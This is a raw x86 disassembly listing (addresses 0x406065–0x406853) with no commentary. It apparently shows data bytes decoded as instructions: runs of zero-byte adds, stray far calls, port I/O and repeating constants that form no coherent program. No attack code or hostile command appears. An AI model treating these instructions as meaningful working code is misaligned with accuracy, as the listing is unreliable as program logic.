  406065:	add    al,0x1e
  406067:	add    BYTE PTR [ecx],dl
  406069:	add    bl,ch
  40606b:	add    al,0x1e
  40606d:	add    BYTE PTR [ecx],dl
  40606f:	add    dl,dh
  406071:	add    al,0x1e
  406073:	add    BYTE PTR [esi-0x80],dl
  406076:	cmp    eax,0x56000a06
  40607b:	or     BYTE PTR [ecx+0x6],0xa
  40607f:	add    BYTE PTR [esi-0x80],dl
  406082:	push   eax
  406083:	push   es
  406084:	or     al,BYTE PTR [eax]
  406086:	push   esi
  406087:	sbb    BYTE PTR [eax+0x6],0xa
  40608b:	add    BYTE PTR [esi-0x80],dl
  40608e:	pop    esi
  40608f:	push   es
  406090:	or     al,BYTE PTR [eax]
  406092:	push   esi
  406093:	and    BYTE PTR [esi+0x6],0xa
  406097:	add    BYTE PTR [esi-0x80],dl
  40609a:	jno    0x4060a2
  40609c:	or     al,BYTE PTR [eax]
  40609e:	push   esi
  40609f:	xor    BYTE PTR [esi+0x6],0xa
  4060a3:	add    BYTE PTR [esi-0x80],dl
  4060a6:	jl     0x4060ae
  4060a8:	or     al,BYTE PTR [eax]
  4060aa:	push   esi
  4060ab:	add    BYTE PTR [ecx+0x56000a06],0x80
  4060b2:	mov    al,BYTE PTR [esi]
  4060b4:	or     al,BYTE PTR [eax]
  4060b6:	push   esi
  4060b7:	adc    BYTE PTR [ecx+0x56000a06],0x80
  4060be:	add    DWORD PTR [bp+si],ecx
  4060c1:	add    BYTE PTR [esi-0x80],dl
  4060c4:	call   0xa080:0x56000a06
  4060cb:	push   es
  4060cc:	or     al,BYTE PTR [eax]
  4060ce:	add    DWORD PTR [eax],eax
  4060d0:	test   al,0x6
  4060d2:	mov    dh,0x4
  4060d4:	add    DWORD PTR [eax],eax
  4060d6:	lds    eax,FWORD PTR [esi]
  4060d8:	mov    dh,0x4
  4060da:	add    DWORD PTR [eax],eax
  4060dc:	fiadd  WORD PTR [esi]
  4060de:	mov    edi,0xf5000104
  4060e3:	push   es
  4060e4:	mov    edi,0x34000104
  4060e9:	pop    es
  4060ea:	fild   DWORD PTR [ecx+eax*1]
  4060ed:	add    BYTE PTR [ebx+0x7],bl
  4060f0:	mov    edi,0x6e000104
  4060f5:	pop    es
  4060f6:	mov    edi,0x85000104
  4060fb:	pop    es
  4060fc:	mov    edi,0x9a000104
  406101:	pop    es
  406102:	mov    edi,0xb1000104
  406107:	pop    es
  406108:	out    0x4,eax
  40610a:	add    DWORD PTR [eax],eax
  40610c:	rol    BYTE PTR [edi],0xf6
  40610f:	add    al,0x1
  406111:	add    BYTE PTR [eax+ecx*1],cl
  406114:	mov    edi,0x32000104
  406119:	or     bh,ah
  40611b:	add    al,0x1
  40611d:	add    BYTE PTR [edi],bh
  40611f:	or     BYTE PTR [edi+0x50000104],bh
  406125:	or     BYTE PTR [ecx],bl
  406127:	add    eax,0x86b0001
  40612c:	out    0x4,eax
  40612e:	add    DWORD PTR [eax],eax
  406130:	mov    ds:0x1052208,al
  406135:	add    cl,bl
  406137:	or     BYTE PTR [ecx],bh
  406139:	add    eax,0x8e00001
  40613e:	fild   DWORD PTR [ecx+edx*2]
  406141:	or     BYTE PTR [ecx],0x9
  406144:	or     al,BYTE PTR [eax]
  406146:	push   ecx
  406147:	sbb    BYTE PTR [ecx],0x9
  40614a:	or     al,BYTE PTR [eax]
  40614c:	push   ecx
  40614d:	and    BYTE PTR [edi],0x9
  406150:	or     al,BYTE PTR [eax]
  406152:	push   esi
  406153:	cmp    BYTE PTR [ebx],0x9
  406156:	jl     0x40615a
  406158:	push   esi
  406159:	or     BYTE PTR [ecx+ecx*1+0x7c],0x2
  40615e:	add    DWORD PTR [eax],eax
  406160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406161:	or     DWORD PTR [edx],ecx
  406163:	add    BYTE PTR [ecx],al
  406165:	add    bh,cl
  406167:	or     DWORD PTR [edx],ecx
  406169:	add    BYTE PTR [ecx],al
  40616b:	add    ah,dh
  40616d:	or     DWORD PTR [edx],ecx
  40616f:	add    BYTE PTR [ecx],al
  406171:	add    BYTE PTR [ecx],ch
  406173:	or     cl,BYTE PTR [edx]
  406175:	add    BYTE PTR [ecx],dh
  406177:	add    BYTE PTR [edx+ecx*1+0x3105d9],al
  40617e:	nop
  40617f:	or     bl,cl
  406181:	add    eax,0xa9b0031
  406186:	fld    DWORD PTR ds:0xaaf0001
  40618c:	out    0x5,al
  40618e:	add    DWORD PTR [eax],eax
  406190:	ror    BYTE PTR [edx],cl
  406192:	out    dx,eax
  406193:	add    eax,0xb010001
  406198:	clc    
  406199:	add    eax,0xb240001
  40619e:	add    DWORD PTR [esi],eax
  4061a0:	push   es
  4061a1:	push   es
  4061a2:	sti    
  4061a3:	or     ebx,DWORD PTR [esi]
  4061a5:	add    BYTE PTR [esi-0x80],dl
  4061a8:	add    ecx,DWORD PTR [esp+edi*2]
  4061ab:	push   es
  4061ac:	push   esi
  4061ad:	or     BYTE PTR [ebx],0xc
  4061b0:	jl     0x4061b8
  4061b2:	push   esi
  4061b3:	sbb    BYTE PTR [ecx],0xc
  4061b6:	jl     0x4061be
  4061b8:	push   esi
  4061b9:	sbb    BYTE PTR [edx+0x56067c06],0x80
  4061c0:	and    DWORD PTR [esp+edi*2],ecx
  4061c3:	push   es
  4061c4:	push   es
  4061c5:	push   es
  4061c6:	sti    
  4061c7:	or     ebx,DWORD PTR [esi]
  4061c9:	add    BYTE PTR [esi-0x80],dl
  4061cc:	and    eax,0x56068f0c
  4061d1:	xor    BYTE PTR [esi+0x6],0x8f
  4061d5:	push   es
  4061d6:	push   esi
  4061d7:	sub    BYTE PTR [ecx],0xc
  4061da:	pop    DWORD PTR [esi]
  4061dc:	push   es
  4061dd:	push   es
  4061de:	sti    
  4061df:	or     ebx,DWORD PTR [esi]
  4061e1:	add    BYTE PTR [esi-0x80],dl
  4061e4:	xor    BYTE PTR [ebx+edx*4],cl
  4061e7:	push   es
  4061e8:	push   esi
  4061e9:	xor    BYTE PTR ds:0x5606930c,0x80
  4061f0:	icebp  
  4061f1:	pop    es
  4061f2:	xchg   ebx,eax
  4061f3:	push   es
  4061f4:	push   esi
  4061f5:	or     BYTE PTR [edx+0x56069306],0x80
  4061fc:	xchg   ecx,eax
  4061fd:	push   es
  4061fe:	xchg   ebx,eax
  4061ff:	push   es
  406200:	push   esi
  406201:	cmp    BYTE PTR [ebx],0xc
  406204:	xchg   ebx,eax
  406205:	push   es
  406206:	push   es
  406207:	push   es
  406208:	sti    
  406209:	or     ebx,DWORD PTR [esi]
  40620b:	add    BYTE PTR [esi-0x80],dl
  40620e:	inc    ebx
  40620f:	or     al,0x9c
  406211:	push   es
  406212:	push   esi
  406213:	or     BYTE PTR [edi+eax*1],0x9c
  406217:	push   es
  406218:	push   esi
  406219:	or     BYTE PTR [eax+0xc],0x9c
  40621d:	push   es
  40621e:	push   esi
  40621f:	sbb    BYTE PTR [eax+0xc],0x9c
  406223:	push   es
  406224:	push   esi
  406225:	and    BYTE PTR [edi+0xc],0x9c
  406229:	push   es
  40622a:	push   esi
  40622b:	xor    BYTE PTR [edx+0xc],0x9c
  40622f:	push   es
  406230:	push   esi
  406231:	sbb    BYTE PTR [eax],0x7
  406234:	pushf  
  406235:	push   es
  406236:	push   esi
  406237:	xor    BYTE PTR [ebp+0xc],0x9c
  40623b:	push   es
  40623c:	push   esi
  40623d:	add    BYTE PTR [ebx+0x56069c0c],0x80
  406244:	xchg   edi,eax
  406245:	or     al,0x9c
  406247:	push   es
  406248:	push   esi
  406249:	and    BYTE PTR [ebx+0x56069c0c],0x80
  406250:	mov    al,0xc
  406252:	pushf  
  406253:	push   es
  406254:	push   esi
  406255:	cmp    BYTE PTR [ecx+0x56069c0c],0x80
  40625c:	les    ecx,FWORD PTR [esp+ebx*4]
  40625f:	push   es
  406260:	push   esi
  406261:	and    BYTE PTR [edi],0x8
  406264:	pushf  
  406265:	push   es
  406266:	push   esi
  406267:	sub    BYTE PTR [ebx],0x7
  40626a:	pushf  
  40626b:	push   es
  40626c:	push   esi
  40626d:	and    BYTE PTR [ecx],0xc
  406270:	pushf  
  406271:	push   es
  406272:	push   es
  406273:	push   es
  406274:	sti    
  406275:	or     ebx,DWORD PTR [esi]
  406277:	add    BYTE PTR [esi-0x80],dl
  40627a:	ror    DWORD PTR [edx+edx*8],1
  40627d:	push   es
  40627e:	push   esi
  40627f:	adc    bh,0xc
  406282:	rol    BYTE PTR [esi],cl
  406284:	push   esi
  406285:	and    dl,0xc
  406288:	rol    BYTE PTR [esi],cl
  40628a:	push   esi
  40628b:	sub    dl,0xc
  40628e:	rol    BYTE PTR [esi],cl
  406290:	push   esi
  406291:	or     cl,0x8
  406294:	rol    BYTE PTR [esi],cl
  406296:	push   esi
  406297:	cmp    BYTE PTR [ebx],0xc
  40629a:	rol    BYTE PTR [esi],cl
  40629c:	push   esi
  40629d:	sub    ch,0xc
  4062a0:	or     al,BYTE PTR [eax]
  4062a2:	push   esi
  4062a3:	xor    bl,0xc
  4062a6:	or     al,BYTE PTR [eax]
  4062a8:	push   esi
  4062a9:	cmp    al,0xc
  4062ac:	or     al,BYTE PTR [eax]
  4062ae:	push   esi
  4062af:	cmp    ah,0xc
  4062b2:	or     al,BYTE PTR [eax]
  4062b4:	push   esi
  4062b5:	add    BYTE PTR [edx],0xd
  4062b8:	or     al,BYTE PTR [eax]
  4062ba:	push   esi
  4062bb:	or     BYTE PTR [eax],0xd
  4062be:	or     al,BYTE PTR [eax]
  4062c0:	push   esi
  4062c1:	adc    BYTE PTR [eax],0xd
  4062c4:	or     al,BYTE PTR [eax]
  4062c6:	push   esi
  4062c7:	adc    BYTE PTR ds:0x56000a0d,0x80
  4062ce:	pop    ss
  4062cf:	or     eax,0x8056000a
  4062d4:	sbb    DWORD PTR ds:0x8056000a,ecx
  4062da:	sbb    ecx,DWORD PTR ds:0x8056000a
  4062e0:	sbb    eax,0x56000a0d
  4062e5:	sbb    BYTE PTR [edi],0xd
  4062e8:	or     al,BYTE PTR [eax]
  4062ea:	push   esi
  4062eb:	and    BYTE PTR [ecx],0xd
  4062ee:	or     al,BYTE PTR [eax]
  4062f0:	push   esi
  4062f1:	sub    BYTE PTR [edi],0xd
  4062f4:	or     al,BYTE PTR [eax]
  4062f6:	push   esi
  4062f7:	sub    dl,0xc
  4062fa:	or     al,BYTE PTR [eax]
  4062fc:	push   esi
  4062fd:	xor    BYTE PTR [ecx*1-0x7fa9fff6],0x3c
  406305:	or     eax,0x8056000a
  40630a:	inc    ebp
  40630b:	or     eax,0x8056000a
  406310:	dec    esp
  406311:	or     eax,0x8056000a
  406316:	push   edi
  406317:	or     eax,0x8056000a
  40631c:	pop    edx
  40631d:	or     eax,0x8056000a
  406322:	pop    esi
  406323:	or     eax,0x8056000a
  406328:	push   0x56000a0d
  40632d:	sub    BYTE PTR [esi+0xd],0xa
  406331:	add    BYTE PTR [esi-0x80],dl
  406334:	jbe    0x406343
  406336:	or     al,BYTE PTR [eax]
  406338:	push   esi
  406339:	cmp    BYTE PTR [ebp+ecx*1+0xa],0x0
  40633e:	push   esi
  40633f:	add    BYTE PTR [eax+0x56000a0d],0x80
  406346:	loop   0x406354
  406348:	or     al,BYTE PTR [eax]
  40634a:	push   esi
  40634b:	add    BYTE PTR [ebx+0x56000a0d],0x80
  406352:	mov    ecx,DWORD PTR ds:0x8056000a
  406358:	xchg   edx,eax
  406359:	or     eax,0x606000a
  40635e:	sti    
  40635f:	or     ebx,DWORD PTR [esi]
  406361:	add    BYTE PTR [esi-0x80],dl
  406364:	xor    BYTE PTR [esi+ecx*1],cl
  406367:	or     BYTE PTR [esi-0x80],dl
  40636a:	clc    
  40636b:	or     al,0xe
  40636d:	or     BYTE PTR [esi-0x80],dl
  406370:	cld    
  406371:	or     al,0xe
  406373:	or     BYTE PTR [esi-0x80],dl
  406376:	add    cl,BYTE PTR ds:0x8056080e
  40637c:	or     BYTE PTR ds:0x8056080e,cl
  406382:	adc    BYTE PTR ds:0x8056080e,cl
  406388:	adc    eax,0x56080e0d
  40638d:	adc    BYTE PTR [edi],0xd
  406390:	push   cs
  406391:	or     BYTE PTR [esi-0x80],dl
  406394:	sbb    DWORD PTR ds:0x8056080e,ecx
  40639a:	sbb    ecx,DWORD PTR ds:0x8056080e
  4063a0:	sbb    eax,0x56080e0d
  4063a5:	sbb    BYTE PTR [edi],0xd
  4063a8:	push   cs
  4063a9:	or     BYTE PTR [esi-0x80],dl
  4063ac:	and    DWORD PTR ds:0x8056080e,ecx
  4063b2:	das    
  4063b3:	or     eax,0x8056080e
  4063b8:	jmp    0x3480:0x56080e0c
  4063bf:	or     eax,0x8056080e
  4063c4:	cmp    al,0xd
  4063c6:	push   cs
  4063c7:	or     BYTE PTR [esi-0x80],dl
  4063ca:	inc    ebp
  4063cb:	or     eax,0x8056080e
  4063d0:	dec    esp
  4063d1:	or     eax,0x8056080e
  4063d6:	push   edi
  4063d7:	or     eax,0x8056080e
  4063dc:	pop    edx
  4063dd:	or     eax,0x8056080e
  4063e2:	pop    esi
  4063e3:	or     eax,0x8056080e
  4063e8:	push   0x56080e0d
  4063ed:	xor    BYTE PTR [esi+0xd],0xe
  4063f1:	or     BYTE PTR [esi-0x80],dl
  4063f4:	outs   dx,BYTE PTR ds:[esi]
  4063f5:	or     eax,0x8056080e
  4063fa:	jl     0x406409
  4063fc:	push   cs
  4063fd:	or     BYTE PTR [esi-0x80],dl
  406400:	or     BYTE PTR ds:0x8056080e,0xe2
  406407:	or     al,0xe
  406409:	or     BYTE PTR [esi-0x80],dl
  40640c:	or     DWORD PTR ds:0x8056080e,0xffffff8b
  406413:	or     eax,0x8056080e
  406418:	xchg   edx,eax
  406419:	or     eax,0x6080e
  40641e:	popf   
  40641f:	or     eax,0x6000a
  406424:	mov    eax,ds:0x6080e0d
  406429:	push   es
  40642a:	sti    
  40642b:	or     ebx,DWORD PTR [esi]
  40642d:	add    BYTE PTR [esi-0x80],dl
  406430:	xor    BYTE PTR [edi+ebx*2],cl
  406433:	or     BYTE PTR [esi-0x80],dl
  406436:	or     ecx,DWORD PTR [edi+ebx*2]
  406439:	or     BYTE PTR [esi-0x80],dl
  40643c:	sbb    DWORD PTR [edi+ebx*2],ecx
  40643f:	or     BYTE PTR [ecx],al
  406441:	add    BYTE PTR [edi+0x104e70d],ah
  406447:	add    BYTE PTR [ebp+ecx*1+0x104e7],dh
  40644e:	fisttp DWORD PTR ds:0x10863
  406454:	call   0x148d866
  406459:	add    BYTE PTR [esi],cl
  40645b:	push   cs
  40645c:	test   DWORD PTR [eax],ecx
  40645e:	add    DWORD PTR [eax],eax
  406460:	inc    edx
  406461:	push   cs
  406462:	mov    edi,0x5f000104
  406467:	push   cs
  406468:	mov    edi,0x50000104
  40646d:	or     BYTE PTR [ecx],bl
  40646f:	add    eax,0xe820001
  406474:	sbb    DWORD PTR ds:0xed80011,eax
  40647a:	mov    cl,0x8
  40647c:	adc    DWORD PTR [eax],eax
  40647e:	add    eax,0xd008b50f
  406483:	and    BYTE PTR [eax],al
  406485:	add    BYTE PTR [eax],al
  406487:	add    BYTE PTR [esi-0x77fbd6f8],dl
  40648d:	add    eax,DWORD PTR [ecx]
  40648f:	add    al,bl
  406491:	and    BYTE PTR [eax],al
  406493:	add    BYTE PTR [eax],al
  406495:	add    BYTE PTR [ecx-0x5afb0200],dl
  40649b:	add    eax,DWORD PTR [ecx]
  40649d:	add    BYTE PTR [eax+0x24],al
  4064a3:	add    BYTE PTR [ecx-0x54faeb00],dl
  4064a9:	add    eax,DWORD PTR [edx]
  4064ab:	add    BYTE PTR [eax+0x25],bh
  4064b1:	add    BYTE PTR [ecx-0x54fade00],dl
  4064b7:	add    eax,DWORD PTR [eax+eax*1]
  4064ba:	test   al,0x27
  4064bc:	add    BYTE PTR [eax],al
  4064be:	add    BYTE PTR [eax],al
  4064c0:	xchg   ecx,eax
  4064c1:	add    BYTE PTR ds:0x603b305,dh
  4064c7:	add    BYTE PTR [eax+0x28],bl
  4064cd:	add    BYTE PTR [ecx-0x41faa600],dl
  4064d3:	add    ecx,DWORD PTR [edx]
  4064d5:	add    bh,dh
  4064d7:	sub    BYTE PTR [eax],al
  4064d9:	add    BYTE PTR [eax],al
  4064db:	add    BYTE PTR [ecx-0x3afa8100],dl
  4064e1:	add    ecx,DWORD PTR [eax+eax*1]
  4064e4:	and    BYTE PTR [ecx],ch
  4064e6:	add    BYTE PTR [eax],al
  4064e8:	add    BYTE PTR [eax],al
  4064ea:	xchg   ecx,eax
  4064eb:	add    BYTE PTR [eax+0xe03cc05],bl
  4064f1:	add    al,ah
  4064f3:	sub    DWORD PTR [eax],eax
  4064f5:	add    BYTE PTR [eax],al
  4064f7:	add    BYTE PTR [ecx-0x33fa4e00],dl
  4064fd:	add    edx,DWORD PTR [eax]
  4064ff:	add    BYTE PTR [ebx+ebp*1],ah
  406502:	add    BYTE PTR [eax],al
  406504:	add    BYTE PTR [eax],al
  406506:	xchg   esi,eax
  406507:	or     bh,cl
  406509:	add    eax,0x120388
  40650e:	sub    BYTE PTR [ebx],0x0
  406511:	add    BYTE PTR [eax],al
  406513:	add    BYTE PTR [esi-0x77fa1ef8],dl
  406519:	add    edx,DWORD PTR [edx]
  40651b:	add    al,dl
  40651d:	sub    eax,DWORD PTR [eax]
  40651f:	add    BYTE PTR [eax],al
  406521:	add    BYTE PTR [esi-0x77fa0af8],dl
  406527:	add    edx,DWORD PTR [edx]
  406529:	add    BYTE PTR [esi+0x2c],al
  40652c:	add    BYTE PTR [eax],al
  40652e:	add    BYTE PTR [eax],al
  406530:	xchg   BYTE PTR [eax],bl
  406532:	or     DWORD PTR [esi],eax
  406534:	rol    DWORD PTR [ebx],cl
  406536:	adc    al,BYTE PTR [eax]
  406538:	and    BYTE PTR [eax+eax*1],ch
  40653b:	add    BYTE PTR [eax],al
  40653d:	add    BYTE PTR [ecx+0x591ae618],dl
  406543:	or     edx,DWORD PTR [edx]
  406545:	add    BYTE PTR [esi+0x2c],cl
  406548:	add    BYTE PTR [eax],al
  40654a:	add    BYTE PTR [eax],al
  40654c:	xchg   BYTE PTR [eax],bl
  40654e:	or     DWORD PTR [esi],eax
  406550:	rol    DWORD PTR [ebx],cl
  406552:	adc    al,BYTE PTR [eax]
  406554:	push   esi
  406555:	sub    al,0x0
  406557:	add    BYTE PTR [eax],al
  406559:	add    BYTE PTR [esi-0x45f94af8],al
  40655f:	add    al,0x12
  406561:	add    BYTE PTR [esi+0x2c],bl
  406564:	add    BYTE PTR [eax],al
  406566:	add    BYTE PTR [eax],al
  406568:	xchg   BYTE PTR [eax],cl
  40656a:	rol    BYTE PTR [esi],1
  40656c:	mov    edx,0x66001204
  406571:	sub    al,0x0
  406573:	add    BYTE PTR [eax],al
  406575:	add    BYTE PTR [esi-0x39f917f8],al
  40657b:	add    al,0x12
  40657d:	add    BYTE PTR [esi+0x2c],ch
  406580:	add    BYTE PTR [eax],al
  406582:	add    BYTE PTR [eax],al
  406584:	xchg   BYTE PTR [eax],cl
  406586:	inc    DWORD PTR [esi]
  406588:	mov    BYTE PTR [edx+edx*1],0x0
  40658c:	jbe    0x4065ba
  40658e:	add    BYTE PTR [eax],al
  406590:	add    BYTE PTR [eax],al
  406592:	xchg   BYTE PTR [eax],bl
  406594:	or     DWORD PTR [esi],eax
  406596:	rol    DWORD PTR [ebx],cl
  406598:	adc    al,BYTE PTR [eax]
  40659a:	stos   BYTE PTR es:[edi],al
  40659b:	sub    al,0x0
  40659d:	add    BYTE PTR [eax],al
  40659f:	add    BYTE PTR [esi-0x21f8c0f8],al
  4065a5:	add    al,0x12
  4065a7:	add    BYTE PTR [edx+0x2c],dh
  4065ad:	add    BYTE PTR [esi-0x1df8b2f8],al
  4065b3:	add    al,0x12
  4065b5:	add    BYTE PTR [ebx+0x2c],bh
  4065bb:	add    BYTE PTR [esi-0x39f89cf8],al
  4065c1:	add    al,0x13
  4065c3:	add    bl,al
  4065c5:	sub    al,0x0
  4065c7:	add    BYTE PTR [eax],al
  4065c9:	add    BYTE PTR [esi-0x39f887f8],al
  4065cf:	add    al,0x13
  4065d1:	add    bl,cl
  4065d3:	sub    al,0x0
  4065d5:	add    BYTE PTR [eax],al
  4065d7:	add    BYTE PTR [esi-0x39f871f8],al
  4065dd:	add    al,0x13
  4065df:	add    bl,dl
  4065e1:	sub    al,0x0
  4065e3:	add    BYTE PTR [eax],al
  4065e5:	add    BYTE PTR [esi-0x39f85bf8],al
  4065eb:	add    al,0x13
  4065ed:	add    bl,bl
  4065ef:	sub    al,0x0
  4065f1:	add    BYTE PTR [eax],al
  4065f3:	add    BYTE PTR [esi-0x11f848f8],al
  4065f9:	add    al,0x13
  4065fb:	add    bl,ah
  4065fd:	sub    al,0x0
  4065ff:	add    BYTE PTR [eax],al
  406601:	add    BYTE PTR [esi-0x2f831f8],al
  406607:	add    al,0x13
  406609:	add    ah,ch
  40660b:	sub    al,0x0
  40660d:	add    BYTE PTR [eax],al
  40660f:	add    BYTE PTR [esi-0x2cf9f6e8],al
  406615:	add    edx,DWORD PTR [ebx]
  406617:	add    BYTE PTR [ecx+0x2d],al
  40661a:	add    BYTE PTR [eax],al
  40661c:	add    BYTE PTR [eax],al
  40661e:	xchg   BYTE PTR [eax],cl
  406620:	sbb    BYTE PTR [eax],cl
  406622:	mov    BYTE PTR [ebx+edx*1],0x0
  406626:	dec    ecx
  406627:	sub    eax,0x0
  40662c:	xchg   BYTE PTR [eax],bl
  40662e:	or     DWORD PTR [esi],eax
  406630:	rol    DWORD PTR [ebx],cl
  406632:	adc    eax,DWORD PTR [eax]
  406634:	pop    esp
  406635:	sub    eax,0x0
  40663a:	xchg   BYTE PTR [eax],cl
  40663c:	aaa    
  40663d:	or     dh,ch
  40663f:	add    al,0x13
  406641:	add    BYTE PTR [ebp+ebp*1+0x0],ah
  406645:	add    BYTE PTR [eax],al
  406647:	add    BYTE PTR [esi-0x39f7b9f8],al
  40664d:	add    al,0x13
  40664f:	add    BYTE PTR [ebp+ebp*1+0x0],ch
  406653:	add    BYTE PTR [eax],al
  406655:	add    BYTE PTR [esi+0x1d085c08],al
  40665b:	add    eax,0x2d740013
  406660:	add    BYTE PTR [eax],al
  406662:	add    BYTE PTR [eax],al
  406664:	xchg   BYTE PTR [eax],cl
  406666:	jno    0x406670
  406668:	out    dx,al
  406669:	add    al,0x13
  40666b:	add    BYTE PTR [ebp+ebp*1+0x0],bh
  40666f:	add    BYTE PTR [eax],al
  406671:	add    BYTE PTR [esi+0x2a08b100],al
  406677:	add    eax,0x2d990013
  40667c:	add    BYTE PTR [eax],al
  40667e:	add    BYTE PTR [eax],al
  406680:	xchg   BYTE PTR [eax],al
  406682:	mov    ebx,0x14052f08
  406687:	add    BYTE PTR [edi+0x2d],ah
  40668d:	add    BYTE PTR [esi-0x2cf9f6e8],al
  406693:	add    edx,DWORD PTR ds:0x2de600
  406699:	add    BYTE PTR [eax],al
  40669b:	add    BYTE PTR [esi+0x3d08ec08],al
  4066a1:	add    eax,0x2dee0015
  4066a6:	add    BYTE PTR [eax],al
  4066a8:	add    BYTE PTR [eax],al
  4066aa:	xchg   BYTE PTR [eax],cl
  4066ac:	aas    
  4066ad:	pop    es
  4066ae:	fiadd  WORD PTR [edx*1+0x2df600]
  4066b5:	add    BYTE PTR [eax],al
  4066b7:	add    BYTE PTR [ebx+0x4208f600],al
  4066bd:	add    eax,0x2e060015
  4066c2:	add    BYTE PTR [eax],al
  4066c4:	add    BYTE PTR [eax],al
  4066c6:	mov    BYTE PTR [eax],0xfa
  4066c9:	or     BYTE PTR [eax+0x5],cl
  4066cc:	push   ss
  4066cd:	add    BYTE PTR [edi],ah
  4066cf:	add    BYTE PTR cs:[eax],al
  4066d2:	add    BYTE PTR [eax],al
  4066d4:	xchg   BYTE PTR [eax],bl
  4066d6:	or     DWORD PTR [esi],eax
  4066d8:	rol    DWORD PTR [ebx],cl
  4066da:	push   ss
  4066db:	add    BYTE PTR [eax],al
  4066dd:	add    BYTE PTR [eax],al
  4066df:	add    BYTE PTR [eax+0x5e209600],al
  4066e5:	or     DWORD PTR [esi+0x1605],esi
  4066eb:	add    BYTE PTR [eax],al
  4066ed:	add    BYTE PTR [eax+0x6b209600],al
  4066f3:	or     DWORD PTR [ebx+0x1705],edi
  4066f9:	add    BYTE PTR [eax],al
  4066fb:	add    BYTE PTR [eax+0x7a209600],al
  406701:	or     edx,eax
  406703:	add    eax,0x2e2f0019
  406708:	add    BYTE PTR [eax],al
  40670a:	add    BYTE PTR [eax],al
  40670c:	xchg   esi,eax
  40670d:	or     BYTE PTR [ecx+0x1b038809],cl
  406713:	add    BYTE PTR [esi],dh
  406715:	add    BYTE PTR cs:[eax],al
  406718:	add    BYTE PTR [eax],al
  40671a:	xchg   BYTE PTR [eax],cl
  40671c:	mov    ecx,0x1b054809
  406721:	add    BYTE PTR [esi+ebp*1+0x0],ch
  406725:	add    BYTE PTR [eax],al
  406727:	add    BYTE PTR [esi+0x4809e008],al
  40672d:	add    eax,0x2ea2001b
  406732:	add    BYTE PTR [eax],al
  406734:	add    BYTE PTR [eax],al
  406736:	xchg   BYTE PTR [eax],cl
  406738:	or     eax,0x1b05480a
  40673d:	add    al,bl
  40673f:	add    BYTE PTR cs:[eax],al
  406742:	add    BYTE PTR [eax],al
  406744:	xchg   BYTE PTR [eax],cl
  406746:	inc    eax
  406747:	or     cl,BYTE PTR [eax+0x5]
  40674a:	sbb    eax,DWORD PTR [eax]
  40674c:	adc    BYTE PTR [edi],ch
  40674e:	add    BYTE PTR [eax],al
  406750:	add    BYTE PTR [eax],al
  406752:	xchg   ebx,eax
  406753:	add    BYTE PTR [edx+0xa],bl
  406756:	enter  0x1b05,0x0
  40675a:	test   al,0x30
  40675c:	add    BYTE PTR [eax],al
  40675e:	add    BYTE PTR [eax],al
  406760:	xchg   ecx,eax
  406761:	add    BYTE PTR [esi+0xa],ch
  406764:	rol    BYTE PTR ds:0x3178001d,1
  40676a:	add    BYTE PTR [eax],al
  40676c:	add    BYTE PTR [eax],al
  40676e:	add    DWORD PTR [eax],0x5de0aa6
  406774:	and    BYTE PTR [eax],al
  406776:	sbb    dh,BYTE PTR [edx]
  406778:	add    BYTE PTR [eax],al
  40677a:	add    BYTE PTR [eax],al
  40677c:	xchg   BYTE PTR [eax],cl
  40677e:	mov    edi,0x2205ea0a
  406783:	add    BYTE PTR [edx],ah
  406785:	xor    al,BYTE PTR [eax]
  406787:	add    BYTE PTR [eax],al
  406789:	add    BYTE PTR [esi-0xcf517f8],al
  40678f:	add    eax,0x322a0022
  406794:	add    BYTE PTR [eax],al
  406796:	add    BYTE PTR [eax],al
  406798:	xchg   BYTE PTR [eax],cl
  40679a:	adc    DWORD PTR [ebx],ecx
  40679c:	cld    
  40679d:	add    eax,0x32320022
  4067a2:	add    BYTE PTR [eax],al
  4067a4:	add    BYTE PTR [eax],al
  4067a6:	xchg   BYTE PTR [eax],cl
  4067a8:	sub    al,0xb
  4067aa:	or     DWORD PTR [esi],eax
  4067ac:	and    al,BYTE PTR [eax]
  4067ae:	cmp    al,0x32
  4067b0:	add    BYTE PTR [eax],al
  4067b2:	add    BYTE PTR [eax],al
  4067b4:	xchg   BYTE PTR [eax],al
  4067b6:	aaa    
  4067b7:	or     edx,DWORD PTR [edx]
  4067b9:	push   es
  4067ba:	and    al,BYTE PTR [eax]
  4067bc:	aam    0x32
  4067be:	add    BYTE PTR [eax],al
  4067c0:	add    BYTE PTR [eax],al
  4067c2:	add    DWORD PTR [eax],0x6180b3d
  4067c8:	and    eax,DWORD PTR [eax]
  4067ca:	add    al,0x34
  4067cc:	add    BYTE PTR [eax],al
  4067ce:	add    BYTE PTR [eax],al
  4067d0:	add    DWORD PTR [eax],0x62b0b4a
  4067d6:	sub    DWORD PTR [eax],eax
  4067d8:	mov    al,0x36
  4067da:	add    BYTE PTR [eax],al
  4067dc:	add    BYTE PTR [eax],al
  4067de:	add    DWORD PTR [eax],0x63b0b5d
  4067e4:	cs add ah,al
  4067e7:	add    BYTE PTR ss:[eax],al
  4067ea:	add    BYTE PTR [eax],al
  4067ec:	add    DWORD PTR [eax],0x6440b69
  4067f2:	xor    DWORD PTR [eax],eax
  4067f4:	les    esi,FWORD PTR [edi]
  4067f6:	add    BYTE PTR [eax],al
  4067f8:	add    BYTE PTR [eax],al
  4067fa:	add    DWORD PTR [eax],0x6540b76
  406800:	ss add ch,ah
  406803:	cmp    eax,DWORD PTR [eax]
  406805:	add    BYTE PTR [eax],al
  406807:	add    BYTE PTR [esi-0x2cf9f6e8],al
  40680d:	add    edi,DWORD PTR [edx]
  40680f:	add    ah,bl
  406811:	cmp    BYTE PTR [eax],al
  406813:	add    BYTE PTR [eax],al
  406815:	add    BYTE PTR [ecx+0x591ae618],dl
  40681b:	or     edi,DWORD PTR [edx]
  40681d:	add    BYTE PTR [ecx],bl
  40681f:	cmp    al,0x0
  406821:	add    BYTE PTR [eax],al
  406823:	add    BYTE PTR [esi-0x2cf9f6e8],al
  406829:	add    edi,DWORD PTR [edx]
  40682b:	add    BYTE PTR [ecx],ah
  40682d:	cmp    al,0x0
  40682f:	add    BYTE PTR [eax],al
  406831:	add    BYTE PTR [esi+0x58060918],al
  406837:	or     BYTE PTR [edx],bh
  406839:	add    BYTE PTR [ecx],dh
  40683b:	cmp    al,0x0
  40683d:	add    BYTE PTR [eax],al
  40683f:	add    BYTE PTR [esi-0x11f253f8],al
  406845:	add    al,0x3c
  406847:	add    BYTE PTR [ecx],bh
  406849:	cmp    al,0x0
  40684b:	add    BYTE PTR [eax],al
  40684d:	add    BYTE PTR [esi-0x11f23ff8],al
  406853:	add    al,0x3c
